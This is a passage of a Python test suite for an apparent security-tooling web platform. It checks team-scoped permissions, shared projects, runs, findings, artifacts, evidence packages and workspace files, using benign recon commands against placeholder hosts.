                f"/projects/{project_id}/auto-promote-rules/{rule_id}",
                headers=viewer_headers,
            )

            assert project_created.status_code == 201
            assert created_rule.status_code == 201
            assert viewer_list.status_code == 200
            assert [item["id"] for item in viewer_list.get_json()["rules"]] == [rule_id]
            assert viewer_preview.status_code == 200
            assert viewer_preview.get_json()["preview"]["new_link_count"] == 1
            assert viewer_create.status_code == 403
            assert viewer_create.get_json()["error"] == "team_forbidden"
            assert viewer_update.status_code == 403
            assert viewer_apply.status_code == 403
            assert viewer_delete.status_code == 403
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_shares_user_workflows_with_role_gated_writes(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_workflows_owner"
            admin_token = "tok_team_workflows_admin"
            operator_token = "tok_team_workflows_operator"
            outsider_token = "tok_team_workflows_outsider"
            self._register_session_token(admin_token)
            self._register_session_token(operator_token)
            self._register_session_token(outsider_token)
            created = self._create_team(client, owner_token, name="Workflow Operators")
            team_id = created.get_json()["team"]["id"]
            admin_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "admin", "label": "Workflow admin"},
            )
            operator_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Workflow operator"},
            )
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": admin_token},
                json={"code": admin_invite.get_json()["invite"]["code"], "display_name": "Workflow admin"},
            ).status_code == 201
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "Workflow operator"},
            ).status_code == 201

            payload = {
                "title": "Team DNS",
                "description": "shared workflow",
                "inputs": [
                    {
                        "id": "domain",
                        "label": "Domain",
                        "type": "domain",
                        "required": True,
                        "placeholder": "example.com",
                    },
                ],
                "steps": [{"cmd": "dig {{domain}} A", "note": "resolve apex"}],
            }
            team_headers = {"X-Session-ID": admin_token, "X-Team-ID": team_id}
            created_workflow = client.post("/session/workflows", json=payload, headers=team_headers)
            workflow = created_workflow.get_json()["workflow"]

            operator_list = client.get(
                "/session/workflows",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            catalog = client.get(
                "/workflows",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            personal_list = client.get("/session/workflows", headers={"X-Session-ID": operator_token})
            outsider_list = client.get(
                "/session/workflows",
                headers={"X-Session-ID": outsider_token, "X-Team-ID": team_id},
            )
            operator_update = client.put(
                f"/session/workflows/{workflow['id']}",
                json={**payload, "title": "Operator edit"},
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            admin_update = client.put(
                f"/session/workflows/{workflow['id']}",
                json={**payload, "title": "Updated team DNS"},
                headers=team_headers,
            )
            admin_delete = client.delete(f"/session/workflows/{workflow['id']}", headers=team_headers)

            assert created_workflow.status_code == 201
            assert workflow["team_id"] == team_id
            assert operator_list.status_code == 200
            assert [item["id"] for item in operator_list.get_json()["items"]] == [workflow["id"]]
            assert catalog.status_code == 200
            assert catalog.get_json()["items"][0]["id"] == workflow["id"]
            assert personal_list.status_code == 200
            assert personal_list.get_json()["items"] == []
            assert outsider_list.status_code == 403
            assert operator_update.status_code == 403
            assert operator_update.get_json()["error"] == "team_forbidden"
            assert admin_update.status_code == 200
            assert admin_update.get_json()["workflow"]["title"] == "Updated team DNS"
            assert admin_delete.status_code == 200
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_shares_projects_and_team_run_links(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_project_owner"
            operator_token = "tok_team_project_operator"
            outsider_token = "tok_team_project_outsider"
            self._register_session_token(operator_token)
            self._register_session_token(outsider_token)
            created = self._create_team(client, owner_token, name="Project Operators")
            team_id = created.get_json()["team"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Project operator"},
            )
            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": invite.get_json()["invite"]["code"], "display_name": "Project operator"},
            )
            assert joined.status_code == 201

            project_created = client.post(
                "/projects",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"name": "Shared recon"},
            )
            assert project_created.status_code == 201
            project_id = project_created.get_json()["project"]["id"]
            assert project_created.get_json()["project"]["team_id"] == team_id
            operator_personal_project = client.post(
                "/projects",
                headers={"X-Session-ID": operator_token},
                json={"name": "Personal recon"},
            )
            assert operator_personal_project.status_code == 201
            operator_personal_project_id = operator_personal_project.get_json()["project"]["id"]

            personal_list = client.get("/projects", headers={"X-Session-ID": owner_token})
            operator_list = client.get(
                "/projects",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            active_set = client.post(
                "/projects/active",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                json={"project_id": project_id},
            )
            active_personal = client.get("/projects/active", headers={"X-Session-ID": operator_token})
            active_team = client.get(
                "/projects/active",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            outsider_list = client.get(
                "/projects",
                headers={"X-Session-ID": outsider_token, "X-Team-ID": team_id},
            )
            assert personal_list.status_code == 200
            assert project_id not in {item["id"] for item in personal_list.get_json()["projects"]}
            assert operator_list.status_code == 200
            assert project_id in {item["id"] for item in operator_list.get_json()["projects"]}
            assert active_set.status_code == 200
            assert active_personal.status_code == 200
            assert active_personal.get_json()["project"] is None
            assert active_team.status_code == 200
            assert active_team.get_json()["project"]["id"] == project_id
            assert outsider_list.status_code == 403
            assert outsider_list.get_json()["error"] == "team_forbidden"

            personal_run_id = "run-team-project-personal"
            team_run_id = "run-team-project-shared"
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, '', 'external', 'nmap personal.example', ?, ?, 0, ?, 1, 'personal output')",
                    (
                        personal_run_id,
                        owner_token,
                        "2026-05-28T11:00:00+00:00",
                        "2026-05-28T11:00:01+00:00",
                        json.dumps([{"text": "personal output", "cls": "", "tsC": "", "tsE": ""}]),
                    ),
                )
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, ?, 'external', 'nmap team.example', ?, ?, 0, ?, 1, 'team output')",
                    (
                        team_run_id,
                        owner_token,
                        team_id,
                        "2026-05-28T11:01:00+00:00",
                        "2026-05-28T11:01:01+00:00",
                        json.dumps([{"text": "team output", "cls": "", "tsC": "", "tsE": ""}]),
                    ),
                )
                conn.commit()

            personal_link_denied = client.post(
                f"/projects/{project_id}/links",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                json={"entity_type": "run", "entity_id": personal_run_id},
            )
            team_linked = client.post(
                f"/projects/{project_id}/links",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                json={"entity_type": "run", "entity_id": team_run_id},
            )
            team_runs = client.get(
                f"/projects/{project_id}/runs",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            team_projects_with_counts = client.get(
                "/projects?include_counts=1",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            personal_project_detail = client.get(
                f"/projects/{project_id}",
                headers={"X-Session-ID": owner_token},
            )

            assert personal_link_denied.status_code == 404
            assert personal_link_denied.get_json()["error"] == "run not found for this session"
            assert team_linked.status_code == 201
            assert team_linked.get_json()["link"]["entity_id"] == team_run_id
            assert team_runs.status_code == 200
            assert [item["id"] for item in team_runs.get_json()["runs"]] == [team_run_id]
            assert team_projects_with_counts.status_code == 200
            counted_project = next(
                item for item in team_projects_with_counts.get_json()["projects"] if item["id"] == project_id
            )
            assert counted_project["counts"]["runs"] == 1
            assert personal_project_detail.status_code == 404

            from blueprints import run as run_routes
            from services.runs.output_model import line_event_from_legacy

            def save_finalized_team_run(run_id, *, link_project_id="", link_active_project=True):
                capture = run_routes._run_output_capture(run_id)
                capture.add_event(line_event_from_legacy("team finalizer output"))
                run_routes._save_completed_run(
                    run_id,
                    operator_token,
                    team_id,
                    "nmap finalized.example",
                    "2026-05-28T11:02:00+00:00",
                    "2026-05-28T11:02:01+00:00",
                    0,
                    capture,
                    link_project_id=link_project_id,
                    link_active_project=link_active_project,
                )

            explicit_team_run_id = "run-team-project-finalized-explicit"
            explicit_personal_run_id = "run-team-project-finalized-personal"
            active_team_run_id = "run-team-project-finalized-active"
            save_finalized_team_run(
                explicit_team_run_id,
                link_project_id=project_id,
                link_active_project=False,
            )
            save_finalized_team_run(
                explicit_personal_run_id,
                link_project_id=operator_personal_project_id,
                link_active_project=False,
            )
            save_finalized_team_run(active_team_run_id)
            with db_connect() as conn:
                explicit_team_link = conn.execute(
                    "SELECT project_id, source FROM project_links WHERE entity_type = 'run' AND entity_id = ?",
                    (explicit_team_run_id,),
                ).fetchone()
                explicit_personal_link = conn.execute(
                    "SELECT project_id, source FROM project_links WHERE entity_type = 'run' AND entity_id = ?",
                    (explicit_personal_run_id,),
                ).fetchone()
                active_team_link = conn.execute(
                    "SELECT project_id, source FROM project_links WHERE entity_type = 'run' AND entity_id = ?",
                    (active_team_run_id,),
                ).fetchone()

            assert dict(explicit_team_link) == {"project_id": project_id, "source": "manual"}
            assert explicit_personal_link is None
            assert dict(active_team_link) == {"project_id": project_id, "source": "active_project"}
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_project_slugs_are_unique_inside_personal_and_team_scopes(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_project_slug_owner"
            team_id = self._create_team(client, owner_token, name="Slug Operators").get_json()["team"]["id"]

            personal_first = client.post(
                "/projects",
                headers={"X-Session-ID": owner_token},
                json={"name": "Case"},
            )
            personal_second = client.post(
                "/projects",
                headers={"X-Session-ID": owner_token},
                json={"name": "Case"},
            )
            team_first = client.post(
                "/projects",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"name": "Case"},
            )
            team_second = client.post(
                "/projects",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"name": "Case"},
            )

            assert personal_first.status_code == 201
            assert personal_second.status_code == 201
            assert team_first.status_code == 201
            assert team_second.status_code == 201
            assert personal_first.get_json()["project"]["slug"] == "case"
            assert personal_second.get_json()["project"]["slug"] == "case-2"
            assert team_first.get_json()["project"]["slug"] == "case"
            assert team_second.get_json()["project"]["slug"] == "case-2"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_run_rewrites_workspace_paths_against_team_workspace(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        workspace_cfg = {
            "workspace_enabled": True,
            "workspace_backend": "tmpfs",
            "workspace_root": str(tmp_path / "workspaces"),
            "workspace_quota_mb": 1,
            "workspace_max_file_mb": 1,
            "workspace_max_files": 10,
            "workspace_inactivity_ttl_hours": 1,
        }
        try:
            owner_token = "tok_team_workspace_run_owner"
            created = self._create_team(client, owner_token, name="Workspace Runtime Operators")
            team_id = created.get_json()["team"]["id"]
            registry = {
                "commands": [
                    {
                        "root": "nmap",
                        "category": "Scanning",
                        "policy": {"allow": ["nmap"], "deny": ["nmap -iL", "nmap -oN"]},
                        "workspace_flags": [
                            {"flag": "-iL", "mode": "read", "value": "separate"},
                            {"flag": "-oN", "mode": "write", "value": "separate"},
                        ],
                    },
                ],
                "pipe_helpers": [],
            }
            from services.teams.scope import team_owner_context
            from services.workspace.files import owner_workspace_name, write_owner_workspace_text_file

            owner = team_owner_context(team_id, actor_session_id=owner_token)
            write_owner_workspace_text_file(owner, "targets.txt", "ip.darklab.sh\n", workspace_cfg)
            _CapturedThread.instances = []
            fake_proc = _RouteFakeProc(pid=8790)

            with mock.patch("config.CFG", {**shell_app.CFG, **workspace_cfg}), \
                 mock.patch("blueprints.run.CFG", {**shell_app.CFG, **workspace_cfg}), \
                 mock.patch("services.commands.registry.load_commands_registry", return_value=registry), \
                 mock.patch("blueprints.run.broker_available", return_value=True), \
                 mock.patch("blueprints.run.runtime_missing_command_name", return_value=None), \
                 mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen, \
                 mock.patch("blueprints.run.pid_register"), \
                 mock.patch("blueprints.run.active_run_register") as active_register, \
                 mock.patch("blueprints.run.publish_run_event"), \
                 mock.patch("services.runs.start.threading", mock.Mock(Thread=_CapturedThread)), \
                 mock.patch("blueprints.run.uuid.uuid4", return_value="run-team-workspace"):
                resp = client.post(
                    "/runs",
                    json={"command": "nmap -iL targets.txt -oN scan.txt", "tab_id": "tab-team"},
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                )

            assert resp.status_code == 202
            shell_command = popen.call_args.args[0][-1]
            assert owner_workspace_name(owner) in shell_command
            assert "targets.txt" in shell_command
            assert "scan.txt" in shell_command
            assert team_id in active_register.call_args.kwargs["team_id"]
            assert _CapturedThread.instances
            workspace_filter = _CapturedThread.instances[0].kwargs["workspace_path_filter"]
            assert workspace_filter.process_output_line(shell_command).count(owner_workspace_name(owner)) == 0
            assert workspace_filter.process_output_line(shell_command).count("/targets.txt") == 1
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_shares_cross_member_project_entities_and_findings(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_project_cross_owner"
            operator_token = "tok_team_project_cross_operator"
            self._register_session_token(operator_token)
            created = self._create_team(client, owner_token, name="Cross Member Operators")
            team_id = created.get_json()["team"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Cross member operator"},
            )
            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": invite.get_json()["invite"]["code"], "display_name": "Cross member operator"},
            )
            assert joined.status_code == 201

            project_created = client.post(
                "/projects",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"name": "Cross member project"},
            )
            assert project_created.status_code == 201
            project_id = project_created.get_json()["project"]["id"]
            run_id = "run-team-project-cross"
            entity_id = "ent_team_project_cross"
            finding_id = "fnd_team_project_cross"
            seen_at = "2026-05-28T14:00:00+00:00"
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, ?, 'external', 'httpx cross-member.example', ?, ?, 0, '[]', 0, '')",
                    (run_id, owner_token, team_id, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO entities "
                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                    "VALUES (?, ?, 'domain', 'cross-member.example', ?, ?, ?, ?)",
                    (entity_id, owner_token, "sig_" + entity_id, seen_at, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO entity_run_links "
                    "(entity_id, run_id, first_seen_at, last_seen_at, occurrence_count) "
                    "VALUES (?, ?, ?, ?, 1)",
                    (entity_id, run_id, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, team_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                    "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, "
                    "raw_line, created) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, 'high', 'finding', 'httpx', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
                    (
                        finding_id,
                        owner_token,
                        team_id,
                        run_id,
                        entity_id,
                        entity_id,
                        "sig_" + finding_id,
                        run_id,
                        run_id,
                        seen_at,
                        seen_at,
                        "cross-member finding",
                        "cross-member finding",
                        seen_at,
                    ),
                )
                conn.execute(
                    "INSERT INTO findings_occurrences (finding_id, run_id, line_number, snippet, seen_at) "
                    "VALUES (?, ?, 1, 'cross-member finding', ?)",
                    (finding_id, run_id, seen_at),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'run', ?, 'manual', ?)",
                    ("pln_team_cross_run", project_id, run_id, seen_at),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'atlas_entity', ?, 'manual', ?)",
                    ("pln_team_cross_entity", project_id, entity_id, seen_at),
                )
                conn.commit()

            operator_headers = {"X-Session-ID": operator_token, "X-Team-ID": team_id}
            label_created = client.post(
                f"/entities/atlas_entity/{entity_id}/labels",
                headers=operator_headers,
                json={"label": "cross-member"},
            )
            note_saved = client.put(
                f"/entities/finding/{finding_id}/note",
                headers=operator_headers,
                json={"body": "visible to the team"},
            )
            projects = client.get("/projects?include_counts=1", headers=operator_headers)
            summary = client.get(f"/projects/{project_id}/summary", headers=operator_headers)
            overview = client.get(f"/projects/{project_id}/overview", headers=operator_headers)
            entities = client.get(f"/projects/{project_id}/entities?type=domain", headers=operator_headers)
            findings = client.get(f"/projects/{project_id}/findings", headers=operator_headers)
            personal_summary = client.get(
                f"/projects/{project_id}/summary",
                headers={"X-Session-ID": operator_token},
            )
            personal_overview = client.get(
                f"/projects/{project_id}/overview",
                headers={"X-Session-ID": operator_token},
            )

            assert label_created.status_code == 201
            assert note_saved.status_code == 200
            assert projects.status_code == 200
            counted_project = next(item for item in projects.get_json()["projects"] if item["id"] == project_id)
            assert counted_project["counts"]["runs"] == 1
            assert counted_project["counts"]["entities"] == 1
            assert counted_project["counts"]["targets"] == 1
            assert counted_project["counts"]["findings"] == 1
            assert counted_project["finding_summary"]["review_states"] == {"new": 1}
            assert counted_project["finding_summary"]["severities"] == {"high": 1}
            assert summary.status_code == 200
            summary_payload = summary.get_json()
            assert summary_payload["counts"]["entities"] == 1
            assert summary_payload["counts"]["findings"] == 1
            assert summary_payload["counts"]["labels"] == 1
            assert summary_payload["counts"]["notes"] == 1
            assert [item["id"] for item in summary_payload["targets"]] == [entity_id]
            assert overview.status_code == 200
            overview_payload = overview.get_json()
            assert overview_payload["rollups"]["target_count"] == 1
            assert overview_payload["rollups"]["finding_severities"]["high"] == 1
            assert overview_payload["targets"][0]["entity_id"] == entity_id
            assert overview_payload["targets"][0]["top_finding_severity"] == "high"
            assert entities.status_code == 200
            assert [item["id"] for item in entities.get_json()["entities"]] == [entity_id]
            assert entities.get_json()["entities"][0]["labels"][0]["label"] == "cross-member"
            assert findings.status_code == 200
            assert [item["id"] for item in findings.get_json()["findings"]] == [finding_id]
            assert findings.get_json()["findings"][0]["note"]["body"] == "visible to the team"
            assert personal_summary.status_code == 404
            assert personal_overview.status_code == 404
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_shares_project_artifacts_and_packages(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        workspace_cfg = {"workspace_enabled": True, "workspace_root": str(tmp_path / "workspaces")}
        try:
            owner_token = "tok_team_artifacts_owner"
            operator_token = "tok_team_artifacts_operator"
            self._register_session_token(operator_token)
            created = self._create_team(client, owner_token, name="Artifact Operators")
            team_id = created.get_json()["team"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Artifact operator"},
            )
            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": invite.get_json()["invite"]["code"], "display_name": "Artifact operator"},
            )
            assert joined.status_code == 201
            from services.teams.storage import token_hash
            with db_connect() as conn:
                operator_member = conn.execute(
                    "SELECT id FROM team_members WHERE team_id = ? AND session_token_hash = ?",
                    (team_id, token_hash(operator_token)),
                ).fetchone()
            operator_member_id = operator_member["id"]

            project_created = client.post(
                "/projects",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"name": "Shared artifacts"},
            )
            assert project_created.status_code == 201
            project_id = project_created.get_json()["project"]["id"]

            run_id = "run-team-artifact-shared"
            artifact_id = "rfa_team_artifact_shared"
            artifact_body = b"team artifact body\n"
            with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                from services.teams.scope import team_owner_context

                personal_shadow = resolve_workspace_path(
                    owner_token,
                    "reports/team-artifact.txt",
                    shell_app.CFG,
                    ensure_parent=True,
                )
                personal_shadow.write_bytes(b"personal shadow body\n")
                artifact_path = workspace_files.resolve_owner_workspace_path(
                    team_owner_context(team_id, actor_session_id=owner_token),
                    "reports/team-artifact.txt",
                    shell_app.CFG,
                    ensure_parent=True,
                )
                artifact_path.write_bytes(artifact_body)
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, ?, 'external', 'cat reports/team-artifact.txt', ?, ?, 0, ?, 1, ?)",
                    (
                        run_id,
                        owner_token,
                        team_id,
                        "2026-05-28T13:00:00+00:00",
                        "2026-05-28T13:00:01+00:00",
                        json.dumps([{"text": "team artifact body", "cls": "", "line_index": 0}]),
                        "team artifact body",
                    ),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'run', ?, 'manual', ?)",
                    ("pln_team_artifact_shared", project_id, run_id, "2026-05-28T13:00:02+00:00"),
                )
                conn.execute(
                    "INSERT INTO run_file_artifacts "
                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
                    "content_type, preview_type, content_sha256, created) "
                    "VALUES (?, ?, ?, 'reports/team-artifact.txt', 'team-artifact.txt', 'output', ?, "
                    "'workspace_flag', 'text/plain', 'text', ?, ?)",
                    (
                        artifact_id,
                        owner_token,
                        run_id,
                        len(artifact_body),
                        hashlib.sha256(artifact_body).hexdigest(),
                        "2026-05-28T13:00:03+00:00",
                    ),
                )
                conn.commit()

            team_artifacts = client.get(
                f"/projects/{project_id}/artifacts",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
            )
            with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                artifact_preview = client.get(
                    f"/projects/{project_id}/artifacts/{artifact_id}/preview",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                )
            artifact_label = client.post(
                f"/entities/run_file_artifact/{artifact_id}/labels",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                json={"label": "reviewed"},
            )
            artifact_note = client.put(
                f"/entities/run_file_artifact/{artifact_id}/note",
                headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                json={"body": "Team artifact note"},
            )
            personal_artifacts = client.get(
                f"/projects/{project_id}/artifacts",
                headers={"X-Session-ID": operator_token},
            )
            with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                package_created = client.post(
                    f"/projects/{project_id}/packages",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                    json={
                        "name": "Team Evidence",
                        "labels": ["handoff"],
                        "notes": "Team package note",
                        "include_artifacts": True,
                        "selection": {
                            "run_ids": [run_id],
                            "artifact_ids": [artifact_id],
                        },
                    },
                )

            assert team_artifacts.status_code == 200
            artifacts_payload = team_artifacts.get_json()
            assert [item["id"] for item in artifacts_payload["artifacts"]] == [artifact_id]
            assert artifacts_payload["artifacts"][0]["created_by"]["display_name"] == "Owner"
            assert artifact_preview.status_code == 200
            assert artifact_preview.get_json()["text"] == artifact_body.decode("utf-8")
            assert artifact_label.status_code == 201
            assert artifact_label.get_json()["label"]["session_id"] == operator_token
            assert artifact_label.get_json()["label"]["team_id"] == team_id
            assert artifact_note.status_code == 200
            assert artifact_note.get_json()["note"]["session_id"] == operator_token
            assert artifact_note.get_json()["note"]["team_id"] == team_id
            assert personal_artifacts.status_code == 404
            assert package_created.status_code == 201
            package = package_created.get_json()["package"]
            assert package["include_artifacts"] is True
            assert package["created_by"]["display_name"] == "Artifact operator"
            assert [item["label"] for item in package["labels"]] == ["handoff"]
            assert package["note"]["body"] == "Team package note"

            owner_packages = client.get(
                f"/projects/{project_id}/packages",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
            )
            with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                package_download = client.get(
                    f"/projects/{project_id}/packages/{package['id']}/download",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                )
                package_job_started = client.post(
                    f"/projects/{project_id}/packages/{package['id']}/download-jobs",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                )

            assert owner_packages.status_code == 200
            assert [item["id"] for item in owner_packages.get_json()["packages"]] == [package["id"]]
            assert owner_packages.get_json()["packages"][0]["created_by"]["display_name"] == "Artifact operator"
            assert package_download.status_code == 200
            with zipfile.ZipFile(io.BytesIO(package_download.data)) as archive:
                names = set(archive.namelist())
                assert "artifacts/reports/team-artifact.txt" in names
                assert archive.read("artifacts/reports/team-artifact.txt") == artifact_body
            assert package_job_started.status_code == 202
            package_job = package_job_started.get_json()["job"]
            deadline = time.time() + 5
            while package_job["status"] not in {"complete", "failed"} and time.time() < deadline:
                time.sleep(0.02)
                package_job_status = client.get(
                    f"/projects/{project_id}/packages/{package['id']}/download-jobs/{package_job['id']}",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                )
                assert package_job_status.status_code == 200
                package_job = package_job_status.get_json()["job"]
            assert package_job["status"] == "complete"
            package_job_download = client.get(
                f"/projects/{project_id}/packages/{package['id']}/download-jobs/{package_job['id']}/download",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
            )
            assert package_job_download.status_code == 200
            package_job_download.close()
            from services.projects import package_jobs
            job_record = package_jobs._read_job(package_job["id"])
            assert job_record is not None
            assert job_record["session_id"] == operator_token
            assert job_record["team_id"] == team_id
            assert job_record["actor_member_id"] == operator_member_id
            with db_connect() as conn:
                package_row = conn.execute(
                    "SELECT session_id FROM evidence_packages WHERE id = ?",
                    (package["id"],),
                ).fetchone()
                metadata_row = conn.execute(
                    "SELECT session_id, team_id FROM entity_labels WHERE entity_type = 'package' AND entity_id = ?",
                    (package["id"],),
                ).fetchone()
                artifact_metadata_row = conn.execute(
                    "SELECT session_id, team_id FROM entity_labels "
                    "WHERE entity_type = 'run_file_artifact' AND entity_id = ?",
                    (artifact_id,),
                ).fetchone()
            assert package_row["session_id"] == operator_token
            assert metadata_row["session_id"] == operator_token
            assert metadata_row["team_id"] == team_id
            assert artifact_metadata_row["session_id"] == operator_token
            assert artifact_metadata_row["team_id"] == team_id
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_scope_shares_workspace_files_and_metadata(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        workspace_cfg = {"workspace_enabled": True, "workspace_root": str(tmp_path / "workspaces")}
        try:
            owner_token = "tok_team_files_owner"
            operator_token = "tok_team_files_operator"
            outsider_token = "tok_team_files_outsider"
            self._register_session_token(operator_token)
            self._register_session_token(outsider_token)
            created = self._create_team(client, owner_token, name="Files Operators")
            team_id = created.get_json()["team"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Files operator"},
            )
            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": invite.get_json()["invite"]["code"], "display_name": "Files operator"},
            )
            assert joined.status_code == 201

            with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                personal_write = client.post(
                    "/workspace/files",
                    headers={"X-Session-ID": owner_token},
                    json={"path": "personal.txt", "text": "personal\n"},
                )
                team_write = client.post(
                    "/workspace/files",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                    json={"path": "shared/notes.txt", "text": "team notes\n"},
                )
                from services.teams.capabilities import Capability, ROLE_CAPABILITIES
                with mock.patch.dict(ROLE_CAPABILITIES, {
                    "operator": frozenset({Capability.VIEW_TEAM, Capability.MANAGE_WORKSPACE_FILES}),
                }):
                    label = client.post(
                        "/entities/workspace_file/shared/notes.txt/labels",
                        headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                        json={"label": "handoff"},
                    )
                    note = client.put(
                        "/entities/workspace_file/shared/notes.txt/note",
                        headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                        json={"body": "Shared team context."},
                    )
                operator_list = client.get(
                    "/workspace/files",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                )
                operator_read = client.get(
                    "/workspace/files/read?path=shared/notes.txt",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                )
                operator_download = client.get(
                    "/workspace/files/download?path=shared/notes.txt",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                )
                personal_list = client.get("/workspace/files", headers={"X-Session-ID": operator_token})
                personal_read = client.get(
                    "/workspace/files/read?path=shared/notes.txt",
                    headers={"X-Session-ID": operator_token},
                )
                outsider_list = client.get(
                    "/workspace/files",
                    headers={"X-Session-ID": outsider_token, "X-Team-ID": team_id},
                )
                moved = client.post(
                    "/workspace/files/move",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                    json={"source": "shared/notes.txt", "destination": "shared/moved.txt"},
                )
                moved_read = client.get(
                    "/workspace/files/read?path=shared/moved.txt",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                )

            assert personal_write.status_code == 200
            assert team_write.status_code == 200
            assert label.status_code == 201
            assert note.status_code == 200
            assert operator_list.status_code == 200
            list_payload = operator_list.get_json()
            assert list_payload["owner"]["scope"] == "team"
            assert list_payload["owner"]["team_id"] == team_id
            assert list_payload["owner"]["read_only"] is False
